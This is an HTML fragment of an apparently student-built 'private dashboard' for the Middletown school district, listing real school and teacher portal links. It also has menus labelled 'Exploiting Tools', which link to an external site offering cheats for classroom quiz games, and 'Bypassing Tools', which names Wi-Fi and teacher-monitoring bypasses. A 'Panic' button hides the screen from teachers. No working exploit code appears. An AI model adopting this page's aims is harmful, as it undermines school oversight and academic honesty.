<div class="cube-face bottom"></div>
</div>
<div id="initText" class="init-text">Initializing System...</div>
<div class="code-rain" id="codeRain"></div>
</div>

<div id="loginScreen" class="login-container hidden">
<div class="login-quickbar">
<div class="flex items-center gap-2">
<button class="panic-btn" onclick="window.open('https://clever.com', '_blank')">
<i class="fas fa-exclamation-triangle"></i> Panic
</button>
</div>
<div class="flex items-center gap-2">
<button onclick="adjustZoom(0.1)"><i class="fas fa-search-plus"></i> Zoom In</button>
<button onclick="adjustZoom(-0.1)"><i class="fas fa-search-minus"></i> Zoom Out</button>
</div>
</div>

<div class="login-box" id="loginBox">
<h2><i class="fas fa-shield-alt"></i> Private System</h2>

<div class="input-group">
<input type="text" id="username" placeholder="Enter Username..." autocomplete="off">
</div>

<div class="input-group">
<input type="password" id="password" placeholder="Enter Password..." autocomplete="off">
</div>

<div class="input-group">
<input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off">
</div>

<div class="toggle-container">
<span>Show Password</span>
<div class="toggle-switch" id="showPasswordToggle">
<div class="toggle-slider"></div>
</div>
</div>

<button class="submit-btn" id="submitBtn">
<i class="fas fa-sign-in-alt"></i> ACCESS SYSTEM
</button>

<div id="errorMsg" class="text-red-400 mt-4 text-sm"></div>
<div id="attemptsText" class="text-yellow-400 mt-2 text-sm">Attempts Left: 5</div>
</div>

<div class="time-date-box">
<div class="time-display" id="currentTime">00:00:00</div>
<div class="date-display" id="currentDate">Loading...</div>
<div class="toggle-container mt-4">
<span>24-Hour Format</span>
<div class="toggle-switch" id="timeFormatToggle">
<div class="toggle-slider"></div>
</div>
</div>
</div>

<div id="resetPopup" class="reset-popup" role="dialog" aria-modal="true" aria-hidden="true">
<p>System Locked. Enter reset code to continue:</p>
<input type="password" id="resetField" class="reset-field" placeholder="Enter Reset Code...">
<button id="resetBtn">Reset Attempts</button>
</div>

</div>

<div id="loadingScreen" class="init-screen hidden">
<div class="loading-cube">
<div class="cube-face front"></div>
<div class="cube-face back"></div>
<div class="cube-face right"></div>
<div class="cube-face left"></div>
<div class="cube-face top"></div>
<div class="cube-face bottom"></div>
</div>
<div class="init-text">Loading Dashboard...</div>
<div class="code-rain" id="loadingCodeRain"></div>
</div>

<div id="dashboard" class="dashboard">
<div id="welcomeNotification" class="notification">
<i class="fas fa-user-check"></i> Welcome <span id="loggedUser">User</span>!
</div>

<div class="dashboard-header">
<div>
<h1 class="text-2xl font-bold"><i class="fas fa-tachometer-alt"></i> Enhanced Private Dashboard</h1>
<p class="text-sm opacity-80">User: <span id="currentUser">Beta.user</span> | ID: <span id="currentUserID">281573</span></p>
</div>
<div class="bg-white text-black px-4 py-2 rounded-lg font-bold">
Version 2.0.0
</div>
</div>

<div class="dashboard-quickbar">
<div class="search-group">
<div class="search-container">
<input type="text" class="search-bar" id="searchBar" placeholder="Search panels, features...">
<button class="search-btn" onclick="performSearch()"><i class="fas fa-search"></i></button>
</div>
<div class="quickbar-time-info">Session Time: <span id="quickbarSessionTime" class="quickbar-time-value">00:00:00</span></div>
<div class="quickbar-time-info">Real Time: <span id="quickbarCurrentTime" class="quickbar-time-value">00:00:00</span></div>
</div>

<div class="quick-btn-group">
<button class="quick-btn" onclick="togglePanel('settingsModal')">
<i class="fas fa-cog"></i> Settings
</button>
<button class="quick-btn" onclick="togglePanel('timerPanel')">
<i class="fas fa-stopwatch"></i> Timer
</button>
<button class="quick-btn" onclick="togglePanel('notesPanel')">
<i class="fas fa-pen"></i> Notes
</button>
<button class="quick-btn" onclick="showStats()">
<i class="fas fa-chart-bar"></i> Stats
</button>
<button class="quick-btn" onclick="takeScreenshot()">
<i class="fas fa-camera"></i> Screenshot
</button>
<button class="quick-btn" onclick="togglePanelsGridVisibility()">
<i class="fas fa-toggle-on"></i> Toggle Sections
</button>
<button class="quick-btn" onclick="adjustZoom(0.1)">
<i class="fas fa-search-plus"></i> Zoom In</button>
<button class="quick-btn" onclick="adjustZoom(-0.1)">
<i class="fas fa-search-minus"></i> Zoom Out</button>
<button class="quick-btn" onclick="restartSystem()">
<i class="fas fa-redo-alt"></i> Restart</button>
<button class="quick-btn panic-btn" onclick="window.open('https://clever.com', '_blank')">
<i class="fas fa-exclamation-triangle"></i> Panic
</button>
<button class="quick-btn" onclick="toggleTheme()">
<i class="fas fa-palette"></i> Theme
</button>
<button class="quick-btn" onclick="logout()">
<i class="fas fa-sign-out-alt"></i> Logout
</button>
</div>
</div>

<div class="announcement-bar mt-4">
<div class="announcement-content">
<p id="announcementText">Important System Announcement: Scheduled maintenance this weekend. System may experience brief interruptions. Please save your work regularly!</p>
</div>
</div>

<div class="feature-hub-section">
    <div class="feature-button-group" onclick="openWifiModal()">
        <span class="icon-wrapper"><i class="fas fa-wifi"></i></span>
        <span class="button-label">School Wifi Info</span>
    </div>
    <div class="feature-button-group" onclick="togglePanel('ipadRestrictionsModal')">
        <span class="icon-wrapper"><i class="fas fa-ban"></i></span>
        <span class="button-label">iPad Restrictions</span>
    </div>
    <div class="feature-button-group" onclick="togglePanel('studentHandbooksModal')">
        <span class="icon-wrapper"><i class="fas fa-book-reader"></i></span>
        <span class="button-label">Student Handbooks</span>
    </div>
    <div class="feature-button-group" onclick="togglePanel('studentWebsitesModal')">
        <span class="icon-wrapper"><i class="fas fa-globe"></i></span>
        <span class="button-label">Student Websites</span>
    </div>
    <div class="feature-button-group" onclick="togglePanel('teacherWebsitesModal')">
        <span class="icon-wrapper"><i class="fas fa-chalkboard-teacher"></i></span>
        <span class="button-label">Teacher Websites</span>
    </div>
    <div class="feature-button-group" onclick="togglePanel('schoolInfoModal')">
        <span class="icon-wrapper"><i class="fas fa-school"></i></span>
        <span class="button-label">School Information</span>
    </div>
    <div class="feature-button-group" onclick="togglePanel('exploitingToolsModal')">
        <span class="icon-wrapper"><i class="fas fa-wrench"></i></span>
        <span class="button-label">Exploiting Tools</span>
    </div>
    <div class="feature-button-group" onclick="togglePanel('keyboardTricksModal')">
        <span class="icon-wrapper"><i class="fas fa-keyboard"></i></span>
        <span class="button-label">Keyboard Tricks</span>
    </div>
    <div class="feature-button-group" onclick="togglePanel('bypassingToolsModal')">
        <span class="icon-wrapper"><i class="fas fa-mask"></i></span>
        <span class="button-label">Bypassing Tools</span>
    </div>
    <div class="feature-button-group" onclick="togglePanel('schoolMapModal')">
        <span class="icon-wrapper"><i class="fas fa-map-marked-alt"></i></span>
        <span class="button-label">School Map</span>
    </div>
    <div class="feature-button-group" onclick="togglePanel('phoneDirectoryModal')">
        <span class="icon-wrapper"><i class="fas fa-phone-alt"></i></span>
        <span class="button-label">Phone Directory</span>
    </div>
    <div class="feature-button-group" onclick="togglePanel('musicWebsitesModal')">
        <span class="icon-wrapper emoji">🎵</span>
        <span class="button-label">Music Websites</span>
    </div>
    <div class="feature-button-group" onclick="togglePanel('gamingWebsitesModal')">
        <span class="icon-wrapper emoji">🎮</span>
        <span class="button-label">Gaming Websites</span>
    </div>
    <div class="feature-button-group" onclick="togglePanel('vpnWebsitesModal')">
        <span class="icon-wrapper emoji">🌐</span>
        <span class="button-label">VPN Websites</span>
    </div>
    <div class="feature-button-group" onclick="togglePanel('calculatorModal')">
        <span class="icon-wrapper"><i class="fas fa-calculator"></i></span>
        <span class="button-label">Calculator & Converter</span>
    </div>
    <div class="feature-button-group" onclick="togglePanel('mediaPlayerModal')">
        <span class="icon-wrapper"><i class="fas fa-play-circle"></i></span>
        <span class="button-label">Media Player</span>
    </div>
</div>

<div class="panels-grid" id="panelsGrid">
<div class="panel" data-panel="calendar">
<div class="panel-header">
<div class="panel-title"><i class="fas fa-calendar"></i> Calendar</div>
<div class="panel-controls">
<button class="panel-btn" onclick="minimizePanel(this)"><i class="fas fa-minus"></i></button>
<button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
</div>
</div>
<div class="calendar-grid" id="calendarGrid">
</div>
</div>

<div class="panel" data-panel="importantDates">
<div class="panel-header">
<div class="panel-title"><i class="fas fa-star"></i> Important Dates</div>
<div class="panel-controls">
<button class="panel-btn" onclick="clearImportantDates()"><i class="fas fa-trash"></i></button>
<button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
</div>
</div>
<div class="content">
<input type="date" id="importantDateDay" class="important-date-input" value="2025-08-24">
<input type="time" id="importantDateTime" class="important-date-input" value="09:00">
<input type="text" id="importantDateEvent" class="important-date-event-input" placeholder="Event Description...">
<button class="quick-btn w-full mt-2" onclick="addImportantDate()">Add Event</button>
<div id="importantDatesList" class="mt-4 max-h-40 overflow-y-auto space-y-2">
</div>
</div>
</div>

<div class="panel" data-panel="facts">
<div class="panel-header">
<div class="panel-title"><i class="fas fa-lightbulb"></i> Random Facts</div>
<div class="panel-controls">
<button class="panel-btn" onclick="refreshFact()"><i class="fas fa-sync"></i></button>
<button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
</div>
</div>
<div id="randomFact" class="text-sm">
Did you know? The human brain contains approximately 86 billion neurons!
</div>
</div>

<div class="panel" data-panel="quotes">
<div class="panel-header">
<div class="panel-title"><i class="fas fa-quote-left"></i> Daily Quote</div>
<div class="panel-controls">
<button class="panel-btn" onclick="refreshQuote()"><i class="fas fa-sync"></i></button>
<button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
</div>
</div>
<div id="dailyQuote" class="text-sm italic">
"The only way to do great work is to love what you do." - Steve Jobs
</div>
</div>

<div class="panel" data-panel="updates">
<div class="panel-header">
<div class="panel-title"><i class="fas fa-sync-alt"></i> System Updates</div>
<div class="panel-controls">
<button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
</div>
</div>
<div class="space-y-2">
<div class="system-update-item">Enhanced UI v2.0 Deployed</div>
<div class="system-update-item">New Security Features Added</div>
<div class="system-update-item">Performance Optimizations</div>
</div>
</div>

<div class="panel" data-panel="notifications">
<div class="panel-header">
<div class="panel-title"><i class="fas fa-bell"></i> Notifications</div>
<div class="panel-controls">
<button class="panel-btn" onclick="clearNotifications()"><i class="fas fa-trash"></i></button>
<button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
</div>
</div>
<div id="notificationsList" class="space-y-2">
<div class="p-2 bg-blue-900 rounded text-xs">System initialized successfully</div>
<div class="p-2 bg-green-900 rounded text-xs">All security checks passed</div>
</div>
</div>

<div class="panel" data-panel="activityLogs">
<div class="panel-header">
<div class="panel-title"><i class="fas fa-list"></i> Activity Logs</div>
<div class="panel-controls">
<button class="panel-btn" onclick="downloadActivityLogs()"><i class="fas fa-download"></i></button>
<button class="panel-btn" onclick="clearActivityLogs()"><i class="fas fa-trash"></i></button>
<button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
</div>
</div>
<div id="activityLogsList" class="max-h-40 overflow-y-auto">
</div>
</div>

<div class="panel" data-panel="errorLog">
<div class="panel-header">
<div class="panel-title"><i class="fas fa-bug"></i> Error Log</div>
<div class="panel-controls">
<button class="panel-btn" onclick="downloadErrorLogs()"><i class="fas fa-download"></i></button>
<button class="panel-btn" onclick="clearErrorLogs()"><i class="fas fa-trash"></i></button>
<button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
</div>
</div>
<div id="errorLogsList" class="max-h-40 overflow-y-auto space-y-2">
</div>
</div>

<div class="panel" data-panel="loginHistory">
<div class="panel-header">
<div class="panel-title"><i class="fas fa-history"></i> Login History</div>
<div class="panel-controls">
<button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
</div>
</div>
<div id="loginHistoryList" class="space-y-2 max-h-40 overflow-y-auto">
</div>
</div>

<div class="panel" data-panel="mouseClicker">
<div class="panel-header">
<div class="panel-title"><i class="fas fa-mouse-pointer"></i> Mouse Clicker</div>
<div class="panel-controls">
<button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
</div>
</div>
<div class="content">
<div id="clickCountDisplay" class="click-count-display">0</div>
<button class="click-button" onclick="incrementClickCounter()">Click Me!</button>
<div class="mouse-clicker-controls">
<button class="quick-btn mt-2" onclick="resetClickCounter()"><i class="fas fa-undo-alt"></i> Reset</button>
</div>
</div>
</div>
</div>

<div id="schoolWifiModal" class="settings-modal">
    <div class="settings-content">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-wifi"></i> School Wifi Information</h2>
            <button onclick="closeModal('schoolWifiModal')" class="text-2xl text-gray-400 hover:text-white">
                <i class="fas fa-times"></i>
            </button>
        </div>
        <div id="wifiOptionsContainer">
            <p class="text-sm text-gray-400 mb-4">Click a network button for details, or "Show All Networks".</p>
            <div class="sub-feature-button-container">
                <button class="sub-feature-button" onclick="displaySingleWifiInfo('Middletown_Core')">Middletown_Core</button>
                <button class="sub-feature-button" onclick="displaySingleWifiInfo('Mtown_Core')">Mtown_Core</button>
                <button class="sub-feature-button" onclick="displaySingleWifiInfo('Mtown Guest')">Mtown Guest</button>
                <button class="sub-feature-button" onclick="displaySingleWifiInfo('Radius Test')">Radius Test</button>
                <button class="sub-feature-button" onclick="displayAllWifiInfo()">Show All Networks</button>
            </div>
        </div>
        <div id="wifiInfoDisplay" class="formatted-info-card"></div>
        <button id="wifiGoBackButton" class="go-back-button" onclick="goBackToWifiOptions()">Go Back</button>
    </div>
</div>

<div id="ipadRestrictionsModal" class="settings-modal">
    <div class="settings-content">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-ban"></i> School iPad Restrictions</h2>
            <button onclick="closeModal('ipadRestrictionsModal')" class="text-2xl text-gray-400 hover:text-white">
                <i class="fas fa-times"></i>
            </button>
        </div>
        <div id="ipadRestrictionsOptionsContainer">
            <p class="text-sm text-gray-400 mb-4">Select to view restrictions or bypasses.</p>
            <div class="sub-feature-button-container">
                <button class="sub-feature-button" onclick="displayiPadRestrictions('restrictions')">Show Restrictions</button>
                <button class="sub-feature-button" onclick="displayiPadRestrictions('bypasses')">Show Bypasses</button>
            </div>
        </div>
        <div id="ipadRestrictionsDisplay" class="formatted-info-card"></div>
        <button id="ipadRestrictionsGoBackButton" class="go-back-button" onclick="goBackToiPadRestrictionsOptions()">Go Back</button>
    </div>
</div>

<div id="studentHandbooksModal" class="settings-modal">
    <div class="settings-content">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-book-reader"></i> Student Handbooks</h2>
            <button onclick="closeModal('studentHandbooksModal')" class="text-2xl text-gray-400 hover:text-white">
                <i class="fas fa-times"></i>
            </button>
        </div>
        <div class="content">
            <p class="text-sm text-gray-400 mb-4">Click any handbook to open it in a new tab.</p>
            <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank" class="sub-feature-button w-full mb-2">Elementary Handbook (Jan 2025)</a>
            <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank" class="sub-feature-button w-full mb-2">Secondary Student Handbook (Jan 2025)</a>
            <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank" class="sub-feature-button w-full mb-2">District Handbook</a>
            <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank" class="sub-feature-button w-full mb-2">RA Academy Handbook (Jan 2025)</a>
            <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/MASD%202024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank" class="sub-feature-button w-full mb-2">Virtual Learning Plan (2024 - 2025)</a>
            <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank" class="sub-feature-button w-full">Dress Code (2024 - 2025)</a>
        </div>
    </div>
</div>

<div id="studentWebsitesModal" class="settings-modal">
    <div class="settings-content">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-globe"></i> Student Websites</h2>
            <button onclick="closeModal('studentWebsitesModal')" class="text-2xl text-gray-400 hover:text-white">
                <i class="fas fa-times"></i>
            </button>
        </div>
        <div class="content">
            <p class="text-sm text-gray-400 mb-4">Click any link to open the website in a new tab.</p>
            <a href="https://www.raiderweb.org" target="_blank" class="sub-feature-button w-full mb-2">School website</a>
            <a href="https://middletownsd.instructure.com/login" target="_blank" class="sub-feature-button w-full mb-2">Canvas</a>
            <a href="https://caresolace.com/site/middletownarea" target="_blank" class="sub-feature-button w-full mb-2">CareSolace</a>
            <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank" class="sub-feature-button w-full mb-2">Clever</a>
            <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank" class="sub-feature-button w-full mb-2">Rumba</a>
            <a href="https://myhealthyzone.fitnessgram.net" target="_blank" class="sub-feature-button w-full mb-2">FitnessGram</a>
            <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank" class="sub-feature-button w-full mb-2">Hazing Reporting</a>
            <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank" class="sub-feature-button w-full mb-2">MAHS Announcements</a>
            <a href="https://id.naviance.com" target="_blank" class="sub-feature-button w-full mb-2">Naviance</a>
            <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank" class="sub-feature-button w-full mb-2">Follett Destiny</a>
            <a href="https://powerschool.raiderweb.org/public/" target="_blank" class="sub-feature-button w-full mb-2">PowerSchool</a>
            <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank" class="sub-feature-button w-full mb-2">Scholastic</a>
            <a href="https://www.safe2saypa.org" target="_blank" class="sub-feature-button w-full mb-2">Safe2Say</a>
            <a href="https://mail.google.com/mail/" target="_blank" class="sub-feature-button w-full mb-2">Gmail</a>
            <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank" class="sub-feature-button w-full mb-2">Balfour</a>
            <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank" class="sub-feature-button w-full mb-2">Linkit</a>
            <a href="https://search.follettsoftware.com/metasearch/ui/53085" target="_blank" class="sub-feature-button w-full mb-2">Destiny Discover</a>
            <a href="https://sites.google.com/raiderweb.org/mams-library/home?authuser=0" target="_blank" class="sub-feature-button w-full mb-2">MAMS Library</a>
            <a href="https://mackinvia.com" target="_blank" class="sub-feature-button w-full mb-2">MackinVIA</a>
            <a href="https://www.noodletools.com" target="_blank" class="sub-feature-button w-full mb-2">Noodletools</a>
            <a href="https://www.worldbookonline.com/home/" target="_blank" class="sub-feature-button w-full mb-2">Worldbook</a>
            <a href="https://teens.powerlibrary.org/?ID=PL2509" target="_blank" class="sub-feature-button w-full mb-2">Teens Power Library</a>
            <a href="https://kids.powerlibrary.org/?ID=PL7321" target="_blank" class="sub-feature-button w-full">Powerkids</a>
        </div>
    </div>
</div>

<div id="teacherWebsitesModal" class="settings-modal">
    <div class="settings-content">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-chalkboard-teacher"></i> Teacher Websites</h2>
            <button onclick="closeModal('teacherWebsitesModal')" class="text-2xl text-gray-400 hover:text-white">
                <i class="fas fa-times"></i>
            </button>
        </div>
        <div class="content">
            <p class="text-sm text-gray-400 mb-4">Click any link to open the website in a new tab.</p>
            <a href="https://alo.acadiencelearning.org/login" target="_blank" class="sub-feature-button w-full mb-2">Acadience Learning</a>
            <a href="https://app.aimswebplus.com/#/login" target="_blank" class="sub-feature-button w-full mb-2">AimswebPlus</a>
            <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank" class="sub-feature-button w-full mb-2">ERP Linq</a>
            <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZWp3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank" class="sub-feature-button w-full mb-2">Barracuda SSO</a>
            <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank" class="sub-feature-button w-full mb-2">Buy Guernsey</a>
            <a href="https://middletownsd.instructure.com/login/ldap" target="_blank" class="sub-feature-button w-full mb-2">Canvas (LDAP)</a>
            <a href="https://caresolace.com/site/middletownarea" target="_blank" class="sub-feature-button w-full mb-2">CareSolace</a>
            <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank" class="sub-feature-button w-full mb-2">Clever</a>
            <a href="https://www.discoveryeducation.com" target="_blank" class="sub-feature-button w-full mb-2">Discovery Education</a>
            <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank" class="sub-feature-button w-full mb-2">Rumba</a>
            <a href="https://raiderweb.gofmx.com/login" target="_blank" class="sub-feature-button w-full mb-2">FMX</a>
            <a href="https://myhealthyzone.fitnessgram.net" target="_blank" class="sub-feature-button w-full mb-2">FitnessGram</a>
            <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank" class="sub-feature-button w-full mb-2">Frontline Education</a>
            <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank" class="sub-feature-button w-full mb-2">Linkit</a>
            <a href="https://id.naviance.com" target="_blank" class="sub-feature-button w-full mb-2">Naviance</a>
            <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank" class="sub-feature-button w-full mb-2">Follett Destiny</a>
            <a href="https://paetep.edulinksolutions.com/login" target="_blank" class="sub-feature-button w-full mb-2">PAETEP</a>
            <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank" class="sub-feature-button w-full mb-2">PowerSchool (Teachers)</a>
            <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank" class="sub-feature-button w-full mb-2">Scholastic</a>
            <a href="https://go.schoolmessenger.com/#/home" target="_blank" class="sub-feature-button w-full mb-2">SchoolMessenger</a>
            <a href="https://www.pdesas.org/standard/" target="_blank" class="sub-feature-button w-full mb-2">PDE SAS</a>
            <a href="https://www.pbisapps.org" target="_blank" class="sub-feature-button w-full mb-2">PBISApps</a>
            <a href="https://masd.happyfox.com/home/" target="_blank" class="sub-feature-button w-full mb-2">HappyFox</a>
            <a href="https://middletownasd-pa.safeschools.com/login" target="_blank" class="sub-feature-button w-full mb-2">SafeSchools</a>
            <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b"id_token"%3a%7b"xms_cc"%3a%7b"values"%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank" class="sub-feature-button w-full">Microsoft Outlook</a>
        </div>
    </div>
</div>

<div id="schoolInfoModal" class="settings-modal">
    <div class="settings-content">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-school"></i> School Information</h2>
            <button onclick="closeModal('schoolInfoModal')" class="text-2xl text-gray-400 hover:text-white">
                <i class="fas fa-times"></i>
            </button>
        </div>
        <div id="schoolInfoOptionsContainer">
            <p class="text-sm text-gray-400 mb-4">Click to view school details.</p>
            <div class="sub-feature-button-container">
                <button class="sub-feature-button" onclick="displaySchoolDetails()">Show School Details</button>
            </div>
        </div>
        <div id="schoolInfoDisplay" class="formatted-info-card"></div>
        <button id="schoolInfoGoBackButton" class="go-back-button" onclick="goBackToSchoolInfoOptions()">Go Back</button>
    </div>
</div>

<div id="exploitingToolsModal" class="settings-modal">
    <div class="settings-content">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-wrench"></i> Exploiting Tools</h2>
            <button onclick="closeModal('exploitingToolsModal')" class="text-2xl text-gray-400 hover:text-white">
                <i class="fas fa-times"></i>
            </button>
        </div>
        <div class="content">
            <p class="text-color-dangerous text-xs mb-4"><strong><i class="fas fa-exclamation-triangle mr-1"></i> Warning:</strong> These tools are external and may not be functional due to external website changes or network restrictions. Use at your own risk. Not affiliated with this system.</p>
            <div class="sub-feature-button-container">
                <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="sub-feature-button">Blooket Exploit</a>
                <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="sub-feature-button">Kahoot Exploit</a>
                <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="sub-feature-button">Gimkit Exploit</a>
                <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="sub-feature-button">Quizlet Exploit</a>
                <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="sub-feature-button">Quizzes Exploit</a>
                <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="sub-feature-button">Quills Exploit</a>
                <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="sub-feature-button">Edpuzzle Exploit</a>
                <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="sub-feature-button">Nearpod Exploit</a>
            </div>
        </div>
    </div>
</div>

<div id="keyboardTricksModal" class="settings-modal">
    <div class="settings-content">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-keyboard"></i> Keyboard Tricks</h2>
            <button onclick="closeModal('keyboardTricksModal')" class="text-2xl text-gray-400 hover:text-white">
                <i class="fas fa-times"></i>
            </button>
        </div>
        <div id="keyboardTricksOptionsContainer">
            <p class="text-sm text-gray-400 mb-4">Click to show system shortcuts.</p>
            <div class="sub-feature-button-container">
                <button class="sub-feature-button" onclick="displayKeyboardShortcuts()">Show Keyboard Shortcuts</button>
            </div>
        </div>
        <div id="keyboardShortcutsDisplay" class="formatted-info-card"></div>
        <button id="keyboardTricksGoBackButton" class="go-back-button" onclick="goBackToKeyboardTricksOptions()">Go Back</button>
    </div>
</div>

<div id="bypassingToolsModal" class="settings-modal">
    <div class="settings-content">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-mask"></i> Bypassing Tools</h2>
            <button onclick="closeModal('bypassingToolsModal')" class="text-2xl text-gray-400 hover:text-white">
                <i class="fas fa-times"></i>
            </button>
        </div>
        <div id="bypassingToolsOptionsContainer">
            <p class="text-sm text-gray-400 mb-4">Click any tool below for status updates.</p>
            <div class="sub-feature-button-container">
                <button class="sub-feature-button" onclick="displayUpdateMessage('Bathroom bypass', 'bypassingToolsDisplay', 'bypassingToolsOptionsContainer', 'bypassingToolsGoBackButton')">Bathroom bypass</button>
                <button class="sub-feature-button" onclick="displayUpdateMessage('Wifi Bypass', 'bypassingToolsDisplay', 'bypassingToolsOptionsContainer', 'bypassingToolsGoBackButton')">Wifi Bypass</button>
                <button class="sub-feature-button" onclick="displayUpdateMessage('Teacher monitoring bypass', 'bypassingToolsDisplay', 'bypassingToolsOptionsContainer', 'bypassingToolsGoBackButton')">Teacher monitoring bypass</button>
                <button class="sub-feature-button" onclick="displayUpdateMessage('Update Coming Soon', 'bypassingToolsDisplay', 'bypassingToolsOptionsContainer', 'bypassingToolsGoBackButton')">Update Coming Soon</button>
                <button class="sub-feature-button" onclick="displayUpdateMessage('Another Update Coming Soon', 'bypassingToolsDisplay', 'bypassingToolsOptionsContainer', 'bypassingToolsGoBackButton')">Another Update Coming Soon</button>
                <button class="sub-feature-button" onclick="displayUpdateMessage('Final Update Coming Soon', 'bypassingToolsDisplay', 'bypassingToolsOptionsContainer', 'bypassingToolsGoBackButton')">Final Update Coming Soon</button>
            </div>
        </div>
        <div id="bypassingToolsDisplay" class="formatted-info-card"></div>
        <button id="bypassingToolsGoBackButton" class="go-back-button" onclick="goBackToBypassingToolsOptions()">Go Back</button>
    </div>
</div>

<div id="schoolMapModal" class="settings-modal">
    <div class="settings-content">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-map-marked-alt"></i> School Building Map</h2>
            <button onclick="closeModal('schoolMapModal')" class="text-2xl text-gray-400 hover:text-white">
                <i class="fas fa-times"></i>
            </button>
        </div>
